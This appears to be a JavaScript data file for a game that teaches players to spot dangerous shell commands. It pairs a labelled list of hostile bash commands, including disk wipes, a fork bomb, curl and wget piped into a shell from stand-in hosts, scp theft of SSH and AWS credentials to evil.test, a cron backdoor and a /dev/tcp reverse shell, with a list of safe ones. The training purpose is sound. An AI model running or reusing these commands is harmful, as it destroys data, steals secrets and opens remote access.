// Command database: safe and dangerous bash commands
// difficulty: 'easy' = obvious, 'medium' = requires reading, 'hard' = deceptive
// desc: explanation shown on death screen

export const DANGEROUS_COMMANDS = [
  // Easy - obvious destructive keywords
  { cmd: 'rm -rf / --no-preserve-root', difficulty: 'easy', desc: 'Recursively deletes every file on the entire system. The --no-preserve-root flag bypasses the safety check.' },
  { cmd: 'rm -rf /*', difficulty: 'easy', desc: 'Deletes everything in the root directory. The wildcard expands to all top-level paths.' },
  { cmd: 'rm -rf /home/*', difficulty: 'easy', desc: 'Wipes all user home directories — every user loses all their files.' },
  { cmd: 'rm -rf /boot', difficulty: 'easy', desc: 'Deletes the boot partition. The system will never start again without recovery.' },
  { cmd: 'rm -rf /etc', difficulty: 'easy', desc: 'Removes all system configuration files. Every service becomes unconfigured.' },
  { cmd: 'mkfs.ext4 /dev/sda1', difficulty: 'easy', desc: 'Formats the primary partition as ext4, destroying all data on it.' },
  { cmd: 'mkfs.xfs /dev/sda', difficulty: 'easy', desc: 'Formats the entire disk with XFS filesystem. All partitions and data are gone.' },
  { cmd: 'mkfs.btrfs -f /dev/nvme0n1', difficulty: 'easy', desc: 'Force-formats an NVMe drive. The -f flag skips all safety prompts.' },
  { cmd: 'dd if=/dev/zero of=/dev/sda bs=1M', difficulty: 'easy', desc: 'Writes zeros over the entire disk, byte by byte. Unrecoverable data destruction.' },
  { cmd: 'dd if=/dev/urandom of=/dev/sda bs=4M', difficulty: 'easy', desc: 'Overwrites the disk with random data. Even forensic recovery becomes impossible.' },
  { cmd: ':(){ :|:& };:', difficulty: 'easy', desc: 'A fork bomb. Recursively spawns processes until the system runs out of memory and crashes.' },
  { cmd: 'chmod -R 000 /', difficulty: 'easy', desc: 'Removes all permissions from every file on the system. Nothing can be read, written, or executed.' },
  { cmd: 'chown -R nobody:nobody /', difficulty: 'easy', desc: 'Changes ownership of every file to "nobody". Root loses control of the system.' },
  { cmd: 'mv /usr /dev/null', difficulty: 'easy', desc: 'Moves the entire /usr directory (containing all programs) into the void. Everything breaks.' },
  { cmd: 'mv / /dev/null', difficulty: 'easy', desc: 'Attempts to move the entire filesystem into /dev/null. Catastrophic.' },
  { cmd: 'shred -vfz /dev/sda', difficulty: 'easy', desc: 'Military-grade disk wiping. Overwrites the drive multiple times with random data then zeros.' },

  // Medium - requires reading the full command
  { cmd: '> /etc/passwd', difficulty: 'medium', desc: 'Truncates the password file to zero bytes. No user can log in anymore, including root.' },
  { cmd: '> /etc/shadow', difficulty: 'medium', desc: 'Empties the shadow password file. All password hashes are lost.' },
  { cmd: 'echo "" > /var/log/syslog', difficulty: 'medium', desc: 'Wipes the system log. All evidence of what happened on the server is gone.' },
  { cmd: 'wget http://evil.test -O- | bash', difficulty: 'medium', desc: 'Downloads and immediately executes a remote script. Classic malware delivery method.' },
  { cmd: 'curl http://malware.test/payload.sh | sh', difficulty: 'medium', desc: 'Pipes a remote script directly into the shell. You have no idea what it will do.' },
  { cmd: 'curl -s http://c2.evil.test/bot.py | python3', difficulty: 'medium', desc: 'Downloads and runs a Python bot from a command-and-control server.' },
  { cmd: 'chmod 777 /etc/shadow', difficulty: 'medium', desc: 'Makes the password hash file world-readable and writable. Anyone can steal or modify passwords.' },
  { cmd: 'chmod -R 777 /', difficulty: 'medium', desc: 'Makes every file on the system readable, writable, and executable by everyone.' },
  { cmd: 'cat /dev/zero > /dev/sda', difficulty: 'medium', desc: 'Redirects an infinite stream of zeros onto the disk. Same as dd but less obvious.' },
  { cmd: 'echo "0.0.0.0 google.com" >> /etc/hosts', difficulty: 'medium', desc: 'Adds a DNS hijack entry. Google.com will stop resolving, breaking many services.' },
  { cmd: 'echo "nameserver 6.6.6.6" > /etc/resolv.conf', difficulty: 'medium', desc: 'Replaces DNS config with a malicious nameserver. All DNS lookups go to the attacker.' },
  { cmd: 'iptables -F && iptables -P INPUT ACCEPT', difficulty: 'medium', desc: 'Drops all firewall rules and sets default policy to ACCEPT. The server is now wide open.' },
  { cmd: 'ufw disable', difficulty: 'medium', desc: 'Disables the firewall entirely. All ports are now exposed to the internet.' },
  { cmd: 'rm -rf /var/lib/dpkg', difficulty: 'medium', desc: 'Destroys the package manager database. You can never install or update packages again.' },
  { cmd: 'rm -rf /var/lib/apt', difficulty: 'medium', desc: 'Removes apt package cache and lists. The system loses track of all installed software.' },
  { cmd: 'kill -9 1', difficulty: 'medium', desc: 'Sends SIGKILL to PID 1 (init/systemd). On some systems this causes an immediate kernel panic.' },
  { cmd: 'killall -9 sshd', difficulty: 'medium', desc: 'Kills all SSH daemon processes. Every remote session drops and no one can reconnect.' },
  { cmd: 'swapoff -a && rm /swapfile', difficulty: 'medium', desc: 'Disables swap and deletes the swap file. System will OOM-kill processes under memory pressure.' },
  { cmd: 'echo c > /proc/sysrq-trigger', difficulty: 'medium', desc: 'Triggers an immediate kernel crash dump. The system reboots without warning.' },
  { cmd: 'halt -f', difficulty: 'medium', desc: 'Immediately halts the system without syncing disks or stopping services. Data corruption likely.' },

  // Hard - deceptive, looks like normal admin work
  { cmd: 'git push --force origin main', difficulty: 'hard', desc: 'Force-pushes to main branch, overwriting remote history. Other developers\' work is lost.' },
  { cmd: 'git reset --hard HEAD~20', difficulty: 'hard', desc: 'Destroys the last 20 commits from local history. All that work is gone.' },
  { cmd: 'git clean -fdx', difficulty: 'hard', desc: 'Removes all untracked files and directories, including ignored ones like .env and build artifacts.' },
  { cmd: 'tar czf /dev/null /home/user/.ssh/', difficulty: 'hard', desc: 'Reads all SSH keys and sends them to /dev/null — but a modified version could exfiltrate them.' },
  { cmd: 'openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/s', difficulty: 'hard', desc: 'Encrypts the password file to a temp location. Classic data exfiltration preparation.' },
  { cmd: 'rsync -avz /home/ evil.test:/stolen/', difficulty: 'hard', desc: 'Syncs the entire home directory to an external server. All user data is being stolen.' },
  { cmd: '> /etc/resolv.conf', difficulty: 'hard', desc: 'Silently empties the DNS config. The server can no longer resolve any domain names.' },
  { cmd: "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config", difficulty: 'hard', desc: 'Enables root SSH login. An attacker can now attempt to brute-force the root password remotely.' },
  { cmd: "sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config", difficulty: 'hard', desc: 'Re-enables password auth on SSH. Key-only security is downgraded to password-guessable.' },
  { cmd: 'ln -sf /dev/null /etc/syslog.conf', difficulty: 'hard', desc: 'Replaces syslog config with a symlink to nothing. All logging stops silently.' },
  { cmd: 'crontab -r', difficulty: 'hard', desc: 'Deletes ALL scheduled cron jobs. Backups, monitoring, cleanup scripts — all gone.' },
  { cmd: 'echo "* * * * * curl evil.test/c|sh" | crontab -', difficulty: 'hard', desc: 'Installs a cron job that runs an attacker\'s script every minute. Persistent backdoor.' },
  { cmd: 'python3 -c "import os; os.system(\'rm -rf /\')"', difficulty: 'hard', desc: 'Hides rm -rf / inside a Python one-liner. The destruction is obfuscated.' },
  { cmd: 'perl -e "system(\'dd if=/dev/zero of=/dev/sda\')"', difficulty: 'hard', desc: 'Uses Perl to execute disk wiping. Another obfuscation layer.' },
  { cmd: 'scp /etc/passwd attacker@evil.test:/tmp/', difficulty: 'hard', desc: 'Copies the system user list to an attacker\'s server. First step in a targeted attack.' },
  { cmd: 'scp -r ~/.aws/ attacker@evil.test:/loot/', difficulty: 'hard', desc: 'Steals AWS credentials. The attacker gets full access to your cloud infrastructure.' },
  { cmd: 'nohup bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &', difficulty: 'hard', desc: 'Opens a reverse shell to the attacker. They now have an interactive terminal on your server.' },
  { cmd: 'history -c && rm ~/.bash_history', difficulty: 'hard', desc: 'Wipes command history. An attacker covering their tracks after compromising the system.' },
  { cmd: 'docker run -v /:/mnt --rm -it alpine rm -rf /mnt/*', difficulty: 'hard', desc: 'Mounts the entire host filesystem into a container and deletes everything. Docker escape attack.' },
  { cmd: 'kubectl delete namespace production', difficulty: 'hard', desc: 'Deletes the entire production namespace in Kubernetes. All pods, services, and deployments gone.' },
  { cmd: 'kubectl delete pods --all -n production', difficulty: 'hard', desc: 'Kills every pod in production. All services go down simultaneously.' },
  { cmd: 'DROP DATABASE production;', difficulty: 'hard', desc: 'SQL command to delete the production database. All application data is permanently lost.' },
  { cmd: 'mongo prod --eval "db.dropDatabase()"', difficulty: 'hard', desc: 'Drops the entire MongoDB production database. Years of data gone in one command.' },
  { cmd: 'redis-cli FLUSHALL', difficulty: 'hard', desc: 'Wipes every key from every Redis database. Sessions, cache, queues — all destroyed.' },
  { cmd: 'psql -c "DROP SCHEMA public CASCADE" prod', difficulty: 'hard', desc: 'Cascading drop of the public schema. All tables, views, and functions are deleted.' },
  { cmd: 'aws s3 rb s3://prod-backups --force', difficulty: 'hard', desc: 'Force-deletes the S3 backup bucket and all its contents. Your safety net is gone.' },
  { cmd: 'aws ec2 terminate-instances --instance-ids $(aws ec2 describe-instances --query "Reservations[].Instances[].InstanceId" --output text)', difficulty: 'hard', desc: 'Terminates every EC2 instance in the account. Entire cloud infrastructure goes down.' },
  { cmd: 'terraform destroy -auto-approve', difficulty: 'hard', desc: 'Destroys all Terraform-managed infrastructure without confirmation. Servers, databases, networks — all gone.' },
  { cmd: 'npm publish --access public', difficulty: 'hard', desc: 'Publishes a private package publicly. Internal code and secrets are now on the public registry.' },
  { cmd: 'openssl req -x509 -nodes -newkey rsa:1024 -keyout /etc/ssl/private/server.key', difficulty: 'hard', desc: 'Generates a weak 1024-bit SSL key, replacing the existing one. HTTPS security is compromised.' },
];

export const SAFE_COMMANDS = [
  // Basic file operations
  { cmd: 'ls -la /var/log', desc: 'Lists files in /var/log with details. Read-only, harmless.' },
  { cmd: 'ls -lh /tmp', desc: 'Lists temp files with human-readable sizes.' },
  { cmd: 'pwd', desc: 'Prints the current working directory.' },
  { cmd: 'cat /etc/hostname', desc: 'Displays the machine\'s hostname.' },
  { cmd: 'cat ~/.bashrc', desc: 'Reads the shell config file.' },
  { cmd: 'head -n 20 /var/log/syslog', desc: 'Shows the first 20 lines of the system log.' },
  { cmd: 'tail -f /var/log/nginx/access.log', desc: 'Follows the nginx access log in real-time.' },
  { cmd: 'wc -l src/*.js', desc: 'Counts lines in JavaScript source files.' },
  { cmd: 'file /usr/bin/python3', desc: 'Identifies the file type of the Python binary.' },
  { cmd: 'stat /etc/nginx/nginx.conf', desc: 'Shows file metadata for the nginx config.' },
  { cmd: 'du -sh /var/log', desc: 'Shows total size of the log directory.' },
  { cmd: 'tree -L 2 /etc/nginx', desc: 'Shows directory tree of nginx config, 2 levels deep.' },
  { cmd: 'md5sum /usr/bin/node', desc: 'Computes checksum of the Node.js binary for verification.' },
  { cmd: 'readlink -f /usr/bin/python', desc: 'Resolves the symlink to find the actual Python binary.' },

  // Search and text
  { cmd: 'grep -r "error" ./logs', desc: 'Searches for "error" in log files recursively.' },
  { cmd: 'grep -i "warning" /var/log/syslog', desc: 'Case-insensitive search for warnings in syslog.' },
  { cmd: 'grep -c "500" /var/log/nginx/access.log', desc: 'Counts 500 errors in the nginx access log.' },
  { cmd: 'find . -name "*.log" -mtime -7', desc: 'Finds log files modified in the last 7 days.' },
  { cmd: 'find /tmp -type f -size +100M', desc: 'Finds large files in /tmp over 100MB.' },
  { cmd: 'awk \'{print $1}\' access.log | sort | uniq -c', desc: 'Counts requests per IP from the access log.' },
  { cmd: 'diff config.yml config.yml.bak', desc: 'Compares current config with the backup version.' },
  { cmd: 'sort -rn /tmp/results.csv | head -20', desc: 'Shows top 20 results sorted numerically.' },
  { cmd: 'cut -d: -f1 /etc/passwd', desc: 'Lists all usernames from the password file.' },

  // System info
  { cmd: 'df -h', desc: 'Shows disk space usage in human-readable format.' },
  { cmd: 'free -m', desc: 'Displays memory usage in megabytes.' },
  { cmd: 'uptime', desc: 'Shows how long the system has been running.' },
  { cmd: 'uname -a', desc: 'Prints full system information (kernel, arch, etc).' },
  { cmd: 'whoami', desc: 'Shows which user you\'re logged in as.' },
  { cmd: 'hostname', desc: 'Displays the system\'s hostname.' },
  { cmd: 'top -b -n 1 | head -20', desc: 'Snapshot of top running processes.' },
  { cmd: 'ps aux | grep nginx', desc: 'Finds running nginx processes.' },
  { cmd: 'lsblk', desc: 'Lists block devices (disks and partitions).' },
  { cmd: 'ip addr show', desc: 'Shows all network interfaces and IPs.' },
  { cmd: 'ss -tlnp', desc: 'Lists listening TCP ports and their processes.' },
  { cmd: 'netstat -tulpn', desc: 'Shows all listening ports with process info.' },
  { cmd: 'lscpu', desc: 'Displays CPU architecture information.' },
  { cmd: 'dmesg | tail -30', desc: 'Shows recent kernel messages.' },
  { cmd: 'cat /proc/meminfo | head -5', desc: 'Shows memory details from the kernel.' },
  { cmd: 'vmstat 1 3', desc: 'Shows virtual memory stats for 3 seconds.' },
  { cmd: 'iostat -x 1 3', desc: 'Shows disk I/O statistics for 3 seconds.' },
  { cmd: 'w', desc: 'Shows who is logged in and what they\'re doing.' },
  { cmd: 'last -10', desc: 'Shows last 10 login sessions.' },

  // Git
  { cmd: 'git status', desc: 'Shows the working tree status.' },
  { cmd: 'git log --oneline -10', desc: 'Shows the last 10 commits in short format.' },
  { cmd: 'git diff HEAD~1', desc: 'Shows changes since the previous commit.' },
  { cmd: 'git branch -a', desc: 'Lists all local and remote branches.' },
  { cmd: 'git pull origin main', desc: 'Fetches and merges latest changes from main.' },
  { cmd: 'git stash list', desc: 'Lists all stashed changes.' },
  { cmd: 'git remote -v', desc: 'Shows configured remote repositories.' },
  { cmd: 'git blame src/main.js | head -20', desc: 'Shows who last modified each line.' },
  { cmd: 'git shortlog -sn', desc: 'Shows commit count per author.' },

  // Docker
  { cmd: 'docker ps', desc: 'Lists running containers.' },
  { cmd: 'docker images', desc: 'Lists locally available Docker images.' },
  { cmd: 'docker logs api-server --tail 50', desc: 'Shows last 50 log lines from the api-server container.' },
  { cmd: 'docker-compose up -d', desc: 'Starts services defined in docker-compose.yml in background.' },
  { cmd: 'docker stats --no-stream', desc: 'Shows container resource usage snapshot.' },
  { cmd: 'docker inspect api-server | jq .[0].State', desc: 'Shows the state of a container in JSON.' },
  { cmd: 'docker network ls', desc: 'Lists Docker networks.' },
  { cmd: 'docker volume ls', desc: 'Lists Docker volumes.' },

  // Package management
  { cmd: 'npm install express', desc: 'Installs the Express.js package.' },
  { cmd: 'npm run build', desc: 'Runs the build script defined in package.json.' },
  { cmd: 'npm test', desc: 'Runs the test suite.' },
  { cmd: 'npm audit', desc: 'Checks for known vulnerabilities in dependencies.' },
  { cmd: 'pip install -r requirements.txt', desc: 'Installs Python dependencies from a requirements file.' },
  { cmd: 'pip list --outdated', desc: 'Shows which Python packages have updates available.' },
  { cmd: 'apt list --installed | wc -l', desc: 'Counts installed system packages.' },
  { cmd: 'cargo build --release', desc: 'Compiles a Rust project in release mode.' },
  { cmd: 'go mod tidy', desc: 'Cleans up Go module dependencies.' },

  // Network
  { cmd: 'curl -I https://example.com', desc: 'Fetches HTTP headers only. Quick health check.' },
  { cmd: 'curl -s https://api.github.com/rate_limit | jq .rate', desc: 'Checks GitHub API rate limit status.' },
  { cmd: 'ping -c 4 8.8.8.8', desc: 'Sends 4 pings to Google DNS. Tests network connectivity.' },
  { cmd: 'dig example.com', desc: 'DNS lookup for example.com.' },
  { cmd: 'traceroute google.com', desc: 'Traces the network path to Google.' },
  { cmd: 'ssh user@production-server', desc: 'Connects to the production server via SSH.' },
  { cmd: 'nslookup api.internal.com', desc: 'Looks up the IP of an internal API hostname.' },
  { cmd: 'wget -q -O /dev/null https://example.com', desc: 'Silently downloads a page to check if the URL works.' },

  // Services
  { cmd: 'systemctl status nginx', desc: 'Checks if nginx is running.' },
  { cmd: 'systemctl restart postgresql', desc: 'Restarts the PostgreSQL database service.' },
  { cmd: 'journalctl -u nginx --since today', desc: 'Shows today\'s nginx logs from systemd journal.' },
  { cmd: 'service cron status', desc: 'Checks if the cron scheduler is running.' },
  { cmd: 'systemctl list-units --failed', desc: 'Lists all failed systemd services.' },
  { cmd: 'nginx -t', desc: 'Tests nginx config for syntax errors without restarting.' },
  { cmd: 'apachectl configtest', desc: 'Validates Apache configuration.' },

  // Kubernetes
  { cmd: 'kubectl get pods -n production', desc: 'Lists pods in the production namespace.' },
  { cmd: 'kubectl logs -f api-deployment-xyz', desc: 'Follows logs from an API pod.' },
  { cmd: 'kubectl describe node worker-01', desc: 'Shows detailed info about a worker node.' },
  { cmd: 'kubectl top pods -n production', desc: 'Shows CPU/memory usage per pod.' },
  { cmd: 'helm list -n production', desc: 'Lists Helm releases in production.' },

  // Databases
  { cmd: 'psql -c "SELECT count(*) FROM users" prod', desc: 'Counts users in the production database.' },
  { cmd: 'redis-cli INFO memory', desc: 'Shows Redis memory usage stats.' },
  { cmd: 'mongosh --eval "db.stats()"', desc: 'Shows MongoDB database statistics.' },
  { cmd: 'mysql -e "SHOW PROCESSLIST"', desc: 'Lists active MySQL connections.' },

  // Tricky decoys (look scary but are safe)
  { cmd: 'kill 38471', desc: 'Kills a specific process by PID. Normal operation.' },
  { cmd: 'kill -HUP $(cat /var/run/nginx.pid)', desc: 'Sends SIGHUP to nginx to reload config gracefully. Standard practice.' },
  { cmd: 'rm -rf ./node_modules', desc: 'Deletes node_modules in the current project. Totally normal, npm install restores it.' },
  { cmd: 'rm -rf ./dist', desc: 'Removes the build output directory. The build command recreates it.' },
  { cmd: 'rm -rf ./.cache', desc: 'Clears the local cache directory. Harmless cleanup.' },
  { cmd: 'rm /tmp/session_*.tmp', desc: 'Cleans up temp session files. Normal maintenance.' },
  { cmd: 'chmod 755 deploy.sh', desc: 'Makes a deploy script executable. Standard file permission.' },
  { cmd: 'chmod 644 config.json', desc: 'Sets config file to owner-write, world-read. Appropriate permissions.' },
  { cmd: 'chown www-data:www-data /var/www/html', desc: 'Sets web directory ownership to the web server user. Correct setup.' },
  { cmd: 'dd if=backup.img of=/dev/sdb1 bs=4M status=progress', desc: 'Restores a backup image to a secondary drive. Intentional operation.' },
  { cmd: 'tar czf backup.tar.gz /home/user/documents', desc: 'Creates a compressed backup archive. Data preservation.' },
  { cmd: 'pkill -f "node server.js"', desc: 'Kills a specific Node.js process by name. Normal restart workflow.' },
  { cmd: 'truncate -s 0 /tmp/debug.log', desc: 'Empties a debug log in /tmp. Routine cleanup.' },
  { cmd: 'docker stop $(docker ps -q)', desc: 'Gracefully stops all running containers. Standard for maintenance.' },
  { cmd: 'docker system prune -f', desc: 'Removes unused Docker data (stopped containers, dangling images). Cleanup.' },
  { cmd: 'npm cache clean --force', desc: 'Clears the npm cache. Fixes corrupted installs.' },
  { cmd: 'rm -rf /tmp/build-*', desc: 'Cleans up temporary build directories. Safe cleanup.' },
];

export function getCommandsForLevel(level, count) {
  const levelConfig = getLevelDifficulty(level);
  const dangerousCount = Math.max(1, Math.round(count * levelConfig.dangerousPercent));
  const safeCount = count - dangerousCount;

  const availableDangerous = DANGEROUS_COMMANDS.filter(
    c => levelConfig.difficulties.includes(c.difficulty)
  );

  const selectedDangerous = shuffle([...availableDangerous])
    .slice(0, dangerousCount)
    .map(c => ({ ...c, isDangerous: true }));

  const selectedSafe = shuffle([...SAFE_COMMANDS])
    .slice(0, safeCount)
    .map(c => ({ ...c, isDangerous: false }));

  const commands = [];
  const allDangerous = [...selectedDangerous];
  const allSafe = [...selectedSafe];

  commands.push(allSafe.shift());

  const remaining = shuffle([...allDangerous, ...allSafe]);
  commands.push(...remaining);

  return commands;
}

function getLevelDifficulty(level) {
  if (level <= 3) {
    return { dangerousPercent: 0.20 + level * 0.02, difficulties: ['easy'] };
  } else if (level <= 6) {
    return { dangerousPercent: 0.28 + level * 0.02, difficulties: ['easy', 'medium'] };
  } else {
    return { dangerousPercent: 0.35 + level * 0.01, difficulties: ['easy', 'medium', 'hard'] };
  }
}

function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}
